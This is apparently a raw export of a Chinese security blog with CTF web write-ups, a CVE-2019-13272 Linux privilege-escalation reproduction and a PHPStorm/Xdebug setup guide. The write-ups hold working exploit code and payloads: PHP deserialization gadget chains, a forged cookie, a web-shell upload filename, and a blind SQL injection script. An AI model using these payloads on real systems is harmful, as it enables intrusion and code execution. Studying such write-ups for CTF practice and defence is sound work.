<h3 id="0x04-Ciscn-总决赛-Laravel"><a href="#0x04-Ciscn-总决赛-Laravel" class="headerlink" title="0x04 Ciscn 总决赛 Laravel"></a>0x04 Ciscn 总决赛 Laravel</h3><p>laravel的1Day漏洞，按理说这题是很难的，只不过出题人留了个session文件，里面有payload，直接改下就可以用，虽然说现场时我是硬挖~。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exploit</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $deferred = <span class="keyword">array</span>();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;pool = $x;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyAdapter</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $setInnerItem = <span class="string">'system'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CacheItem</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $innerItem = <span class="string">'cat /flag'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> \Symfony\Component\Cache\Adapter\TagAwareAdapter(<span class="keyword">new</span> \Symfony\Component\Cache\Adapter\ProxyAdapter());</span><br><span class="line">$a-&gt;deferred = <span class="keyword">array</span>(<span class="string">'aa'</span>=&gt;<span class="keyword">new</span> \Symfony\Component\Cache\CacheItem);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">O%<span class="number">3</span>A47%<span class="number">3</span>A%<span class="number">22</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CTagAwareAdapter%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>deferred%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">22</span>aa%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A33%<span class="number">3</span>A%<span class="number">22</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CCacheItem%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>innerItem%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>cat+%<span class="number">2</span>Fflag%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>pool%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A44%<span class="number">3</span>A%<span class="number">22</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CProxyAdapter%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>setInnerItem%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
<p>比赛中修复是通过直接删除TagAwareAdapter中的__destruct魔术方法进行加固</p>
<h3 id="0x05-Ciscn-总决赛-easyweb"><a href="#0x05-Ciscn-总决赛-easyweb" class="headerlink" title="0x05 Ciscn 总决赛 easyweb"></a>0x05 Ciscn 总决赛 easyweb</h3><p>漏洞点应该不是一个，解题时利用的是upload处的file_put_contents，由于会将文件名写入.log.php文件中，所以可以直接植入任意代码，中间就一个过来php，可以利用<?= ?>来执行php代码（这里一定要闭合），不过到达上传点需要先登录，在user.php和upload.php中都需要 <strong>username===admin</strong> 分析代码<br>function.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $username,$secret;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"username"</span>]))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    $username=decode($_COOKIE[<span class="string">"username"</span>],$secret);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写脚本计算cookie</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str,$key)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $tmp=<span class="string">""</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $tmp .= chr(ord($str[$i])^ord($key[$i%strlen($key)]));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> base64_encode($tmp);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$secret=<span class="string">"!*(fp60zoy"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> encode(<span class="string">'admin'</span>,$secret);</span></span><br></pre></td></tr></table></figure>
<p>得到<strong>cookie[‘username’] = QE5FDx4=</strong>，到user.php中发包即可</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line">Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">"file"</span>; <span class="attribute">filename</span>=<span class="string">"&lt;?= eval(<span class="variable">$_REQUEST</span>[pass]);?&gt;"</span></span><br><span class="line">Content-Type: image/png</span><br></pre></td></tr></table></figure>

<h3 id="0x06-高明的黑客"><a href="#0x06-高明的黑客" class="headerlink" title="0x06 高明的黑客"></a>0x06 高明的黑客</h3><p>（强网杯线上题）</p>
<p>我解这题是通过爆破解的 ~~，写了一个脚本，抓取文件中$_GET和$_POST里的参数，然后通过发送请求包执行echo xxxxx;的命令，如果xxxxx出了，说明执行成功了，也就是找到后门了，结果真的跑出来了。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#find.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: Cyc1e</span></span><br><span class="line"><span class="comment"># @Date:   2019-05-25 12:12:51</span></span><br><span class="line"><span class="comment"># @Last Modified by:   Cyc1e</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2019-05-25 12:23:34</span></span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">flies = os.listdir(<span class="string">'./src'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flies:</span><br><span class="line">	url = <span class="string">'http://127.0.0.1/src/'</span>+i</span><br><span class="line">	f = open(<span class="string">'./src/'</span>+i)</span><br><span class="line">	bb = f.read()</span><br><span class="line">	f.close()</span><br><span class="line">	rr = re.compile(<span class="string">r'(?&lt;=_GET\[\').*(?=\'\])'</span>)</span><br><span class="line">	aa = rr.findall(bb)</span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> aa:</span><br><span class="line">		payload = url + <span class="string">'/?'</span> + c + <span class="string">'=phpinfo();'</span></span><br><span class="line">		print payload</span><br><span class="line">		req.requests.get(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'Windows NT C 6.1 build'</span> <span class="keyword">in</span> req.content:</span><br><span class="line">			print payload</span><br><span class="line">			<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
<p>最后找到是xk0SzyKwfzw.php，交互参数为：Efa5BVG</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#xk0SzyKwfzw.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//......</span></span><br><span class="line">$XnEGfa = $_GET[<span class="string">'Efa5BVG'</span>] ?? <span class="string">' '</span>;</span><br><span class="line">$aYunX = <span class="string">"sY"</span>;</span><br><span class="line">$aYunX .= <span class="string">"stEmXnsTcx"</span>;</span><br><span class="line">$aYunX = explode(<span class="string">'Xn'</span>, $aYunX);</span><br><span class="line">$kDxfM = <span class="keyword">new</span> stdClass();</span><br><span class="line">$kDxfM-&gt;gHht = $aYunX[<span class="number">0</span>];</span><br><span class="line">($kDxfM-&gt;gHht)($XnEGfa);</span><br></pre></td></tr></table></figure>
<p>其中$kDxfM-&gt;gHht 的值为 sYstEm，所以传个命令就好了。</p>
<h3 id="0x07-upload"><a href="#0x07-upload" class="headerlink" title="0x07 upload"></a>0x07 upload</h3><p>（强网杯线上题）</p>
<p>考点为信息收集+反序列化利用，直接访问<code>www.tar.gz</code>获得源码。思路为：上传一个含有一句话木马的图片，通过反序列化漏洞将png图片修改为php文件其中反序列化点在Index.php中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">        <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>序列化点在Login.phph中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($user_info) &#123;</span><br><span class="line">    <span class="keyword">if</span> (md5($password) === $user_info[<span class="string">'password'</span>]) &#123;</span><br><span class="line">        $cookie_data=base64_encode(serialize($user_info));</span><br><span class="line">        cookie(<span class="string">"user"</span>,$cookie_data,<span class="number">3600</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;success(<span class="string">'Login successful!'</span>, url(<span class="string">'../home'</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">'Login failed!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>其中反序列化的参数值取自于cookie[‘user’]，我们可以控制，并且在Prifile.php中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">        <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在不上传文件的情况下，即empty($_FILES)为真值时，触发upload_img()即可修改文件名所以攻击链为Register中的<strong>destruct -&gt;Profile中的</strong>call-&gt;__get-&gt;upload_img</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exploit</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="comment">//include('Index.php');</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$check = <span class="keyword">new</span> Register();</span><br><span class="line">$check-&gt;registed=<span class="number">0</span>;</span><br><span class="line">$check-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">$check-&gt;checker-&gt;except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line">$check-&gt;checker-&gt;ext=<span class="number">1</span>;</span><br><span class="line">$check-&gt;checker-&gt;filename_tmp=<span class="string">"./upload/2b7bc98024d801eda1d1f9120e838398/fb5c81ed3a220004b71069645f112867.png"</span>;</span><br><span class="line">$check-&gt;checker-&gt;filename=<span class="string">"./upload/2b7bc98024d801eda1d1f9120e838398/fb5c81ed3a220004b71069645f112867.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($check));</span><br></pre></td></tr></table></figure>
<p>没找到flag<del>~</del></p>
<h3 id="0x08-Hack-word"><a href="#0x08-Hack-word" class="headerlink" title="0x08 Hack word"></a>0x08 Hack word</h3><p>一道盲注题，语句：id=if(ascii(substr((select(flag)from(flag)),1,1))=102,2,1)，其中select(xx)from(xx)的用法，需要知道列名才可以用，题目直接给了，所以直接用脚本跑就好了。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="attribute">url</span>=<span class="string">'http://web43.buuoj.cn/index.php'</span></span><br><span class="line">ll = <span class="string">'fqwertyuiopasdfghjklzxcvbnm&#125;&#123;1234567890'</span></span><br><span class="line"><span class="attribute">flag</span>=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,50):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> ll:</span><br><span class="line">		cha = ord(j)</span><br><span class="line">		<span class="attribute">ss</span>=<span class="string">'if(ascii(substr((select(flag)from(flag)),%s,1))=%s,2,1)'</span>%(i,cha)</span><br><span class="line">		sql=&#123;<span class="string">"id"</span>:ss&#125;</span><br><span class="line">		<span class="attribute">req</span>=requests.post(url=url,data=sql)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"Do you want"</span> <span class="keyword">in</span> req.content.decode(<span class="string">'UTF-8'</span>):</span><br><span class="line">			flag+=j</span><br><span class="line">			<span class="builtin-name">print</span>(flag)</span><br><span class="line">			break</span><br><span class="line"><span class="builtin-name">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="0x09-piapiapia"><a href="#0x09-piapiapia" class="headerlink" title="0x09 piapiapia"></a>0x09 piapiapia</h3><p>访问<a href="http://www.zip可以拿到源码，所以主要就是代码审计的事情，不过在查看网页源码的时候，可以看到相关文件的base64值，所以思路也就是让photo对应的文件为config.php文件，就可以得到flag了。" target="_blank" rel="noopener">www.zip可以拿到源码，所以主要就是代码审计的事情，不过在查看网页源码的时候，可以看到相关文件的base64值，所以思路也就是让photo对应的文件为config.php文件，就可以得到flag了。</a></p>
<h3 id="0x0A-admin"><a href="#0x0A-admin" class="headerlink" title="0x0A admin"></a>0x0A admin</h3><p> (HCTF的题目)</p>
<p>这题一共有三个解法，题目源码在登入任意账号后到改密码页面有提示：<a href="https://github.com/woadsl1234/hctf_flask/，本题的主要考点在于Unicode欺骗，所以这里只记录该解法，其中routes.py" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/，本题的主要考点在于Unicode欺骗，所以这里只记录该解法，其中routes.py</a></p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">def <span class="keyword">register</span>():</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> request<span class="function">.<span class="keyword">method</span> == '<span class="title">POST</span>':</span></span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">    ......</span><br><span class="line">def login():</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> request<span class="function">.<span class="keyword">method</span> == '<span class="title">POST</span>':</span></span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">'name'</span>] = name</span><br><span class="line">    ......</span><br><span class="line">def change():</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> request<span class="function">.<span class="keyword">method</span> == '<span class="title">POST</span>':</span></span><br><span class="line">        name = strlower(session[<span class="string">'name'</span>])</span><br></pre></td></tr></table></figure>
<p>经过了三次的strlower小写转换，其中strlow函数为</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span></span><span class="symbol">:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>
<p>该版本的Twisted库对于Unicode中的Small Capital，例如ᴀ的转换过程为ᴀ -&gt; A -&gt; a，恰好代码中的注册，登录，改密码操作中执行的nodeprep.prepare()次数足够将ᴀᴅᴍɪɴ转成admin,也就是注册一个ᴀᴅᴍɪɴ账号，绕后登录后修改密码时修改的时admin账号的密码。该题有三个解法，其他解法阔以看看飘零兄写的文章：<a href="https://www.anquanke.com/post/id/164086" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164086</a></p>
<h3 id="0x0B-DE1CTF赛题"><a href="#0x0B-DE1CTF赛题" class="headerlink" title="0x0B DE1CTF赛题"></a>0x0B DE1CTF赛题</h3><p>参考本菜的De1CTF web wp即可：<a href="https://www.jianshu.com/p/0a02f4ff6a7e" target="_blank" rel="noopener">https://www.jianshu.com/p/0a02f4ff6a7e</a> </p>
<p><strong>最近太忙了，没时间刷题了，有时间再写</strong></p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-13272 Linux本地提权漏洞复现</title>
    <url>/2019/07/31/CVE-2019-13272-Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="0x01-相关信息"><a href="#0x01-相关信息" class="headerlink" title="0x01 相关信息"></a>0x01 相关信息</h3><p>漏洞类型：Linux本地提权<br>漏洞影响范围：Linux内核版本低于5.1.17<br>测试主机信息：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Linux ubuntu <span class="number">4.15</span><span class="number">.0</span><span class="number">-30</span>-generic #<span class="number">32</span>-Ubuntu SMP Thu Jul <span class="number">26</span> <span class="number">17</span>:<span class="number">42</span>:<span class="number">43</span> UTC <span class="number">2018</span> x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
<h3 id="Exploit测试"><a href="#Exploit测试" class="headerlink" title="Exploit测试"></a>Exploit测试</h3><p>EXP下载：<a href="https://github.com/Cyc1eC/CVE-2019-13272" target="_blank" rel="noopener">exploit下载地址</a>，进行编译运行即可获得本地root权限（<em>需要交互式shell</em>）</p>
<figure class="highlight stan"><table><tr><td class="code"><pre><span class="line">gcc cve-<span class="number">2019</span>-<span class="number">13272</span>_<span class="built_in">exp</span>.c -o <span class="built_in">exp</span></span><br><span class="line">./<span class="built_in">exp</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/07/31/CVE-2019-13272-Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8418106-2949b6bf609d4912.png" alt></p>
<p>目前Linux已经提供修复补丁，下载地址：<br><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee" target="_blank" rel="noopener">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee</a><br>漏洞相关信息：<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1903" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1903</a></p>
]]></content>
      <categories>
        <category>水滴随笔</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>提权</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows下 PHPstorm + Xdebug 动态调试环境配置</title>
    <url>/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>配置本地的phpstorm + Xdebug动态环境真的是一个糟心的事，之前一直出问题，现在重新配简单的记录下，本地的php环境是用phpstudy实现，各个版本都默认带有xdebug插件，php.ini中配置调用就好。</p>
<h3 id="0x01-php-ini配置"><a href="#0x01-php-ini配置" class="headerlink" title="0x01 php.ini配置"></a>0x01 php.ini配置</h3><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">zend_extension</span>=<span class="string">"D:\PhpStudy2018\PHPTutorial\php\php-7.0.12-nts\ext\php_xdebug.dll"</span> //xdebug.dll物理地址</span><br><span class="line"><span class="attr">xdebug.remote_enable</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.remote_host</span>=localhost </span><br><span class="line"><span class="attr">xdebug.remote_port</span>=<span class="number">9000</span></span><br><span class="line"><span class="attr">xdebug.idekey</span>=PHPSTORM</span><br></pre></td></tr></table></figure>
<h3 id="0x02-PHPstorm配置"><a href="#0x02-PHPstorm配置" class="headerlink" title="0x02 PHPstorm配置"></a>0x02 PHPstorm配置</h3><p>1）File | Settings | Languages &amp; Frameworks | PHP</p>
<p>配置对应的php版本</p>
<p><img src="/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/8418106-e58a871c23d738c4.png" alt></p>
<p>接着配置一下PHP.exe的路径和xdebug插件的路径</p>
<p><img src="/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/8418106-074d644b4d8cb233.png" alt></p>
<p>2）File | Settings | Languages &amp; Frameworks | PHP | Debug</p>
<p><img src="/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/8418106-d0dd831cea12f1da.png" alt></p>
<p>3）File | Settings | Languages &amp; Frameworks | PHP | Debug | DBGp Proxy</p>
<p><img src="/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/8418106-024fc91bcfc88518.png" alt></p>
<p>4）File | Settings | Languages &amp; Frameworks | PHP | Servers</p>
<p>配置Host信息，也就是web服务信息（Use path mappings也可以点上，有些文件找不到路由关系）</p>
<p><img src="/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/8418106-0b4f4b1264581428.png" alt></p>
<p>5）Run | Edit Configurations -&gt; Add New Configurations</p>
<p>添加一个PHP Web Page页面，配置好相关的Configuration信息，个人习惯用Chrome</p>
<p><img src="/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/8418106-acf8b3fe5ef87b57.png" alt></p>
<h3 id="0x03-Chrome插件配置"><a href="#0x03-Chrome插件配置" class="headerlink" title="0x03 Chrome插件配置"></a>0x03 Chrome插件配置</h3><p>Chrome浏览器安装 Xdebug helper 插件，IDE key配置成PhpStorm就OK</p>
<p><img src="/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/8418106-0e9ace0c49a2ac02.png" alt></p>
<p>到这里就都配置完毕了，动调的时候在相关页面下好断点，Chrome的 Xdebug helper 开启debug模式，phpstorm打开监听模式（右上角的小电话）</p>
<p><img src="/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/8418106-bb11cb631168cede.png" alt></p>
]]></content>
      <categories>
        <category>水滴随笔</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>Discuz ML V3.x 代码注入漏洞详细分析</title>
    <url>/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</url>
